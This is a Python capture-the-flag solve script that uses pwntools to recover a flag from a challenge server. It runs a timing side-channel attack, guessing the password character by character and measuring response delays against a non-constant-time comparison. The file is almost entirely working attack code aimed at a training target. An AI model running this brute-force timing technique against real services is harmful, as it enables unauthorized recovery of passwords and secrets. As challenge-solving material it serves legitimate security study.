from multiprocessing import context
import time
import string
from pwn import *

context.log_level = 'error'

host = 'challenges.cybersecuritychallenge.pt'
port = 24411

known_flag = "CSCPT{TIME_"

charset = string.ascii_uppercase + "{}_"

for i in range(60):
    found_char = False
    
    for char in charset:
        # Pad the payload to 61 bytes. This ensures we don't accidentally match 
        # leftover memory data on the binary's stack.
        test_payload = (known_flag + char).ljust(61, '\x01') + '\n'
        
        try:
            p = remote(host, port)
            p.recvuntil(b"senha?") # Wait for the prompt
            
            start_time = time.time()
            p.send(test_payload.encode('utf-8'))
            
            # Receive the response ("Errado\n" or "Bem vindo\n")
            p.recvall(timeout=10) 
            end_time = time.time()
            
            elapsed = end_time - start_time
            
            # 0.5s for each correct character + 0.5s for the current guess.
            # We subtract 0.15s to account for potential network delivery speeds
            expected_min_time = ((len(known_flag) + 1) * 0.5) - 0.15
            
            # If the remote server took longer than expected, we got a hit!
            if elapsed >= expected_min_time:
                known_flag += char
                print(f"[+] Character found: '{char}' -> Flag so far: {known_flag}")
                found_char = True
                p.close()
                break
                
            p.close()
            
        except Exception as e:
            # Silently catch timeouts/connection drops and try again
            if 'p' in locals():
                p.close()
            
    # If we loop through all characters and find nothing, or we hit a closing brace
    if not found_char or known_flag.endswith('}'):
        print("\n[!] Reached end of flag or failed to find next character.")
        break